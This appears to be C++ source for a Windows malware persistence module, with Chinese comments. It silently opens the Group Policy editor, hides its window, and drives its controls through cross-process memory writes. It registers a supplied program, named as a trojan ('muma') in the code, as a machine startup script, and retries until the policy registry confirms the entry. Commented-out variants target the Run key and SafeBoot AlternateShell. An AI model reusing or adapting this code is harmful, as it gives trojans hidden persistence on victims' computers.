#include "stdafx.h"
#include "windows.h"
#include "TCHAR.h"
#include "Tlhelp32.h"
#include "commctrl.h"
#include "shlwapi.h"

#include "Iphlpapi.h"
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"shlwapi.lib")



//通过组策略来写启动项

//#include "myprocess.h"

HWND hSysTreeViewWnd;
HWND hSysListViewWnd;

//HWND hCustomTabWnd;
HWND hWndFromProcessID;
HWND hWndFromClassName;

char *wWindowName="\xE8\x6C\x8C\x51\x68\x88\x16\x7F\x91\x8F\x68\x56";
DWORD dwWindowProcessId = 0;



LPVOID pbuf1;
LPVOID pbuf2;
LPVOID pbuf3;

HANDLE hProcess;


// #ifdef UNICODE
// #define _tmemset wmemset
// /*#pragma comment(lib,"foxsdkW.lib")*/
// 
// #else
// #pragma comment(lib,"foxsdkA.lib")
// #define _tmemset memset
// 
// 
// #endif



//获取FolderView窗口

// typedef struct EMNUARGS 
// {
// 	TCHAR *szWndClassName;
// 	TCHAR *szWndText;
// 	HWND  hWnd;
// 	DWORD dwWndProcessID;
// //	HWND  hChildWnd;
// }EMNUARGS,*pEMNUARGS;

EMNUARGS EmnuArgs;




BOOL CALLBACK GetWndByWndArgs(HWND hWnd, LPARAM lParam)
{
	DWORD dwProcessId = 0;
	TCHAR szDesWndText[MAX_PATH]={0};
	//TCHAR szSrcWndText[MAX_PATH]={0};
	TCHAR szDesWndClassName[MAX_PATH]={0};
	//TCHAR szSrcWndClassName[MAX_PATH]={0};

	GetWindowThreadProcessId(hWnd, &dwProcessId);

	pEMNUARGS pEmnuArgs=(pEMNUARGS)lParam;

	if (pEmnuArgs->dwWndProcessID&&dwProcessId!=pEmnuArgs->dwWndProcessID)
	{
		return TRUE;
	}

	GetWindowText(hWnd,szDesWndText,MAX_PATH);
	GetClassName(hWnd,szDesWndClassName,MAX_PATH);


	if (pEmnuArgs->szWndText)
	{
		if(!_tcsicmp(szDesWndText,pEmnuArgs->szWndText))	pEmnuArgs->hWnd=hWnd;
		else pEmnuArgs->hWnd=0;
	}

	if (pEmnuArgs->szWndClassName)
	{
		if(!_tcsicmp(szDesWndClassName,pEmnuArgs->szWndClassName))	pEmnuArgs->hWnd=hWnd;	
		else pEmnuArgs->hWnd=0;
	}

	//找到句柄后停止枚举
	if (pEmnuArgs->hWnd)
	{
		return FALSE;
	}
	return TRUE;
}

//模拟双击程序
// BOOL Exlplorer_Select(TCHAR *szRunExePath,WORD wShow)
// {
// 
// 
// 	PROCESS_INFORMATION ProcessInformation={0};
// 
// 	STARTUPINFO StartupInfo={0};
// 
// 	//_tmemset(&StartupInfo,0,sizeof(STARTUPINFO));
// 	StartupInfo.cb=sizeof(StartupInfo);
// 	StartupInfo.dwFlags =STARTF_USESHOWWINDOW;
// 	StartupInfo.wShowWindow =wShow;
// 
// 	
// 	int  dwNum = 0;
// 
// 	TCHAR* szTempBuf[MAX_PATH*2]={0};
// 
// 	_tcsncpy((TCHAR*)szTempBuf,(TCHAR*)szRunExePath,MAX_PATH*2);
// 
// 	for (dwNum=0;dwNum<10;dwNum++)
// 	{
// 		if (CreateProcess(0,(LPTSTR)szTempBuf, 0, 0, 0, 0, 0, 0, &StartupInfo,&ProcessInformation))
// 		{
// 			//Sleep(1000);
// 			return TRUE;
// 		}
// 	}
// 	return FALSE;
// 
// }


void HideWnd(HWND hWnd)
{
	DWORD dwExStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
	dwExStyle|=WS_EX_LEFTSCROLLBAR;

	for (int i=0;i<=100;i++)
	{
		SetWindowLong(hWnd,WS_EX_LEFTSCROLLBAR,dwExStyle);
		SetWindowPos(hWnd,0, 0, 0, 0, 0, SWP_HIDEWINDOW|SWP_NOSIZE|SWP_NOMOVE|SWP_NOZORDER);
		ShowWindow(hWnd,0);
	}
}


HWND SendKeyClickMessage(HWND hClickWnd,UINT Msg,WPARAM wParam,LPARAM lParam,TCHAR *szWndName)
{
	DWORD dwCount;


	HWND hWnd=0;
	int wShowWindow=0;

	do
	{
		dwCount=0;
		if (hWnd){
			return hWnd;
		}

		PostEnterKey(hClickWnd);
		PostMessage(hClickWnd,Msg,wParam,0);
		PostMessage(hClickWnd,Msg+1,wParam,0);

		while(dwCount<=500)
		{
			hWnd = FindWindow(0,szWndName);
			if (hWnd)
			{
				HideWnd(hWnd);
				return hWnd;
			}

			Sleep(10);
			dwCount++;
		}
		wShowWindow++;
	}
	while ( wShowWindow < 1000+50 );

	return 0;
}


HWND CreateWndProcess(TCHAR *szFileName)
{

	HWND hWnd=0;
	WORD wShowWindow=0;

	TCHAR szCmd[MAX_PATH];
	wsprintf(szCmd,"explorer.exe /select, %s",szFileName);


	//TEXT("explorer.exe /select, C:\\WINDOWS\\system32\\gpedit.msc")
	
	if (!Exlplorer_Select(szCmd,wShowWindow)){
		return hWnd;
	}

	TCHAR szFilePath[MAX_PATH];
	StrCpyA(szFilePath,(LPCTSTR)szFileName);

	*(StrRChr(szFilePath,NULL,'\\'))=0;

	TCHAR szShort[MAX_PATH];
	
	StrCpyA(szShort,StrRChr(szFilePath,NULL,'\\')+1);

	while(wShowWindow<=1000)
	{
		memset(&EmnuArgs,0,sizeof(EmnuArgs));

		EmnuArgs.szWndText=szFilePath;

		EnumWindows(GetWndByWndArgs,(LPARAM)(&EmnuArgs));

		if (!EmnuArgs.hWnd)
		{

			memset(&EmnuArgs,0,sizeof(EmnuArgs));
			EmnuArgs.szWndText=szShort;
			EnumWindows(GetWndByWndArgs,(LPARAM)(&EmnuArgs));
			if (EmnuArgs.hWnd){
				break;
			}
		}
		else break;
		wShowWindow++;
		Sleep(10);
	}

	if (!EmnuArgs.hWnd)
	{
		return hWnd;
	}

	HWND hParentWnd=EmnuArgs.hWnd;
	memset(&EmnuArgs,0,sizeof(EmnuArgs));

	EmnuArgs.szWndText=TEXT("FolderView");
	EmnuArgs.szWndClassName=TEXT("SysListView32");
	
	EnumChildWindows(hParentWnd,GetWndByWndArgs,(LPARAM)(&EmnuArgs));
	//hRegWnd=EmnuArgs.hWnd;


	hWnd=SendKeyClickMessage(EmnuArgs.hWnd,WM_KEYDOWN,VK_RETURN,0,"组策略");

	//hWnd=SendKeyClickMessage(hRegWnd,WM_LBUTTONDOWN,0,0,"组策略");


	return hWnd;
}


BOOL LoadFile(TCHAR *szFileName)
{
	HWND hWnd=CreateWndProcess(szFileName);
	if (!hWnd)
	{
		return FALSE;
	}
	
	memset(&EmnuArgs,0,sizeof(EmnuArgs));

	EmnuArgs.szWndClassName=TEXT("SysTreeView32");



	EnumChildWindows(hWnd,GetWndByWndArgs,(LPARAM)(&EmnuArgs));
	hSysTreeViewWnd=EmnuArgs.hWnd;


// 	memset(&EmnuArgs,0,sizeof(EmnuArgs));
// 	EmnuArgs.szWndClassName=TEXT("AMCCustomTab");
// 
// 
// 	EnumChildWindows(hWnd,GetWndByWndArgs,(LPARAM)(&EmnuArgs));
// 	hCustomTabWnd=EmnuArgs.hWnd;


	memset(&EmnuArgs,0,sizeof(EmnuArgs));
	EmnuArgs.szWndClassName=TEXT("SysListView32");

	EnumChildWindows(hWnd,GetWndByWndArgs,(LPARAM)(&EmnuArgs));
	hSysListViewWnd=EmnuArgs.hWnd;


	if (hSysListViewWnd&&hSysTreeViewWnd)
	{
		GetWindowThreadProcessId(hWnd,&dwWindowProcessId);
		hProcess = OpenProcess(PROCESS_TERMINATE|PROCESS_VM_OPERATION |PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_QUERY_INFORMATION,0,dwWindowProcessId);


		//			DWORD flAllocationType=MEM_DECOMMIT|PAGE_EXECUTE_WRITECOPY|PAGE_EXECUTE|PAGE_READONLY|PAGE_READWRITE;
		pbuf1=VirtualAllocEx(hProcess,0,0x28,MEM_COMMIT,0x4);

		pbuf2=VirtualAllocEx(hProcess,0,60,MEM_COMMIT, 4);
		pbuf3=VirtualAllocEx(hProcess, 0,256,MEM_COMMIT,4);
		return TRUE;
	}
	return FALSE;

}

DWORD FindProcessID(DWORD InheritedFromUniqueProcessId)
{


	if (InheritedFromUniqueProcessId != -1 )
	{

		HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

		PROCESSENTRY32 pe32;

		pe32.dwSize = sizeof( PROCESSENTRY32 );

		Process32First( hSnapshot, &pe32 );
		do
		{

			if ( pe32.th32ProcessID == InheritedFromUniqueProcessId )
				break;
		}while (Process32Next( hSnapshot, &pe32 ));
		CloseHandle(hSnapshot);
	}
	return InheritedFromUniqueProcessId;
}

HTREEITEM GetTreeRegWnd(HTREEITEM hItemParentWnd,CHAR *szRegPath)//查找SafeBoot句柄
{


	if(!hItemParentWnd)
	{
		return 0;
	}

	HTREEITEM hItemChildWnd=(HTREEITEM)SendMessage(hSysTreeViewWnd, TVM_GETNEXTITEM,TVGN_CHILD,(LPARAM)hItemParentWnd);
	if (!hItemChildWnd)
	{
		return 0;
	}

	while ( 1 )
	{

		CHAR  ReadBuffer[0X100];

		memset(ReadBuffer,0,0x100);

		TVITEM Tvitem;
		memset((TCHAR*)&Tvitem,0,sizeof(TVITEM));

		Tvitem.mask=TVIF_HANDLE|TVIF_TEXT;
		Tvitem.hItem=hItemChildWnd;
		Tvitem.pszText=(LPTSTR)pbuf3;
		Tvitem.cchTextMax=MAX_PATH;


		WriteProcessMemory(hProcess,pbuf1,(LPVOID)&Tvitem, sizeof(TVITEM),0);
		SendMessage(hSysTreeViewWnd,TVM_GETITEMA,0,(LPARAM)pbuf1);//获取句柄内容

		ReadProcessMemory(hProcess,pbuf3,ReadBuffer, 0x100, 0);
		//_asm int 3

		if ( !StrCmpI(szRegPath,ReadBuffer))
			break;
		hItemChildWnd = (HTREEITEM)SendMessage(hSysTreeViewWnd, TVM_GETNEXTITEM,TVGN_NEXT,(LPARAM)hItemChildWnd);
		if ( !hItemChildWnd ) return 0; 
	}
	return hItemChildWnd;
}

DWORD GetListRegOrder(CHAR *szRegPath)//查找AlternateShell的序号
{


	if (!hSysListViewWnd)
	{
		return -1;
	}

	DWORD dwNnumberofitems= SendMessage(hSysListViewWnd,LVM_GETITEMCOUNT,0,0);
	
	if ( dwNnumberofitems<=0)
	{
		return -1;
	}

	DWORD dwItemIndex=0;
	while ( 1 )
	{



		CHAR  ReadBuffer[0x100];

		memset(ReadBuffer,0,0x100);

		LVITEM Lvitem;

		memset((TCHAR*)&Lvitem,0,sizeof(LVITEM));


		Lvitem.mask=LVIF_TEXT;
		Lvitem.iItem=dwItemIndex;
		Lvitem.pszText=(LPTSTR)pbuf3;
		Lvitem.cchTextMax=MAX_PATH;


		WriteProcessMemory(hProcess, pbuf2, (LPVOID)&Lvitem,sizeof(LVITEM), 0);
		SendMessage(hSysListViewWnd,LVM_GETITEMA,0,(LPARAM)pbuf2);
		ReadProcessMemory(hProcess, pbuf3, ReadBuffer, 0x100, 0);
		if ( !strcmp(szRegPath,ReadBuffer))
			break;
		++dwItemIndex;
		if (dwItemIndex>dwNnumberofitems)
		{
			return -1;
		}

	}
	return dwItemIndex;

}



// char szTreeReg[10][100]=
// {
// 	"HKEY_LOCAL_MACHINE",
// 	"SYSTEM",
// 	"CurrentControlSet",
// 	"Control",
// 	"SafeBoot"
// };
// 
// char szListReg[10][100]=
// {
// 	"AlternateShell"
// };


// CHAR szTreeReg[10][100]=
// {
// 	"HKEY_CURRENT_USER",
// 	"Software",
// 	"Microsoft",
// 	"Windows",
// 	"CurrentVersion",
// 	"Run",
// 	""	
// };


CHAR szTreeReg[10][100]=
{
	"计算机配置",
	"Windows 设置",
	"脚本 (启动/关机)",
	""
};


CHAR szListReg[10][100]=
{
	"svchost",
	""
};

/*HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run*/

HTREEITEM FindItemWnd()
{

	HTREEITEM hFindWindow;

	//得到项目的句柄(参数：TVGN_ROOT得到根句柄)
	HTREEITEM hItemRootWnd=(HTREEITEM)SendMessage(hSysTreeViewWnd,TVM_GETNEXTITEM,TVGN_ROOT,0);
	if (!hItemRootWnd)
	{
		return 0;
	}

	//选择一个item
	SendMessage(hSysTreeViewWnd, TVM_SELECTITEM ,TVGN_CARET,(LPARAM)hItemRootWnd);

	//展开或折叠指定item(参数：TVE_EXPAND展开指定项目)
	SendMessage(hSysTreeViewWnd, TVM_EXPAND, TVM_EXPAND,(LPARAM)hItemRootWnd);
	//SendMessageA(hSysTreeViewWnd, 0x1102, 0x1102,(LPARAM)hWindow);
	DWORD i=0;

	while (strlen(szTreeReg[i]))
	{


		//_asm int 3

		hFindWindow =GetTreeRegWnd(hItemRootWnd,szTreeReg[i]);

		if (hFindWindow)
		{

			SendMessage(hSysTreeViewWnd,TVM_SELECTITEM ,TVGN_CARET,(LPARAM)hFindWindow);

			SendMessage(hSysTreeViewWnd, TVM_EXPAND, TVM_EXPAND,(LPARAM) hFindWindow);
			Sleep(0xA);
			++i;
			hItemRootWnd= hFindWindow;
		}
		else break;
	}

	return hFindWindow;
}


BOOL FindRegValue(LPSTR lpszFileName)
{

	HKEY hKey = NULL;
	LONG lRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\System\\Scripts\\Startup\\0",0,KEY_QUERY_VALUE|KEY_ENUMERATE_SUB_KEYS,&hKey);

	if (lRes != ERROR_SUCCESS)
	{
		return FALSE;
	}

	DWORD dwIndex=0;
	TCHAR szBuffer[MAX_PATH];
	DWORD dwSize = MAX_PATH;
	FILETIME time;

	while (RegEnumKeyEx(hKey,dwIndex, szBuffer, &dwSize, NULL, NULL, NULL,
		&time)==ERROR_SUCCESS)
	{
		dwIndex++;

		HKEY hSubKey;

		hSubKey=NULL;

		lRes = RegOpenKeyExA(hKey,szBuffer,0,KEY_QUERY_VALUE,&hSubKey);


		memset(szBuffer,0,MAX_PATH);

		if (lRes==ERROR_SUCCESS)
		{
			
			DWORD dwType=0;
			dwSize = MAX_PATH;
			//_asm int 3
			RegQueryValueExA(hSubKey,"Script",0,&dwType,(LPBYTE)szBuffer, &dwSize);

			//RegQueryValue(hSubKey,"Script",szBuffer, (PLONG)&dwSize);
			RegCloseKey(hSubKey);


			if(StrCmpI(lpszFileName,szBuffer)==0) return TRUE;
		}

		memset(szBuffer,0,MAX_PATH);

	}
	RegCloseKey(hKey);

	return FALSE;
}


DWORD WriteReg(TCHAR *szPath)
{

	if (!hSysTreeViewWnd||!hSysListViewWnd)
	{
		return 0;
	}
	//_asm int 3

	HTREEITEM hFindWindow=FindItemWnd();
	if (!hFindWindow)
	{
		return FALSE;
	}

	DWORD i=0;
	DWORD dwItemIndex=0;

	LVITEM *Lvitem=new LVITEM;;
	memset((char*)Lvitem,0,sizeof(LVITEM));


	Lvitem->mask=LVIF_STATE;
	Lvitem->iItem=dwItemIndex;
	Lvitem->state=LVIS_SELECTED;
	Lvitem->stateMask=LVIS_SELECTED;

	DWORD dwWriteMem=0;
	WriteProcessMemory(hProcess,pbuf2,(LPVOID)Lvitem,sizeof(LVITEM),&dwWriteMem);
	SendMessage(hSysListViewWnd,LVM_SETITEM,dwWriteMem,(LPARAM)pbuf2);

	delete Lvitem;

	HWND hWnd=SendKeyClickMessage(hSysListViewWnd,WM_KEYDOWN,VK_RETURN,0,"启动 属性");

	if (!hWnd)
		return FALSE;


	HWND hStartWnd=hWnd;
	
	memset(&EmnuArgs,0,sizeof(EmnuArgs));
	EmnuArgs.szWndText=TEXT("添加(&D)...");
	EnumChildWindows(hWnd,GetWndByWndArgs,(LPARAM)(&EmnuArgs));

	HWND hChildWnd=SendKeyClickMessage(EmnuArgs.hWnd,WM_LBUTTONDOWN,0,0,"添加脚本");



	if (!hChildWnd)
		return FALSE;

	memset(&EmnuArgs,0,sizeof(EmnuArgs));
	EmnuArgs.szWndClassName=TEXT("Edit");
	EnumChildWindows(hChildWnd,GetWndByWndArgs,(LPARAM)(&EmnuArgs));
	SendMessage(EmnuArgs.hWnd, WM_SETTEXT, 0, (LPARAM)szPath);
	SendMessage(hChildWnd, WM_COMMAND, 1, 0);
	SendMessage(hStartWnd,WM_COMMAND,1,0);
	return 0;
}


BOOL Loader(TCHAR *szMumaPath)
{

 	__try
 	{


		TCHAR szSystemDir[MAX_PATH];
		GetSystemDirectory(szSystemDir,MAX_PATH);
		StrCatA(szSystemDir,"\\gpedit.msc");


		if (LoadFile(szSystemDir) )
		{
 			WriteReg(szMumaPath);
 			TerminateProcess(hProcess,0);
			Sleep(0x64u);
		}
	}

	_except(EXCEPTION_EXECUTE_HANDLER)
	{
		return 1;
	}
	return 0;

}


void  WriteRegStartRun(char *lpszDstExeName)
{

	DWORD dwtime=0;
	while(!FindRegValue(lpszDstExeName)&&dwtime<=5)
	{
	    Loader(lpszDstExeName);
 		Sleep(1000*30);
 		dwtime++;
	}
	return ;

}


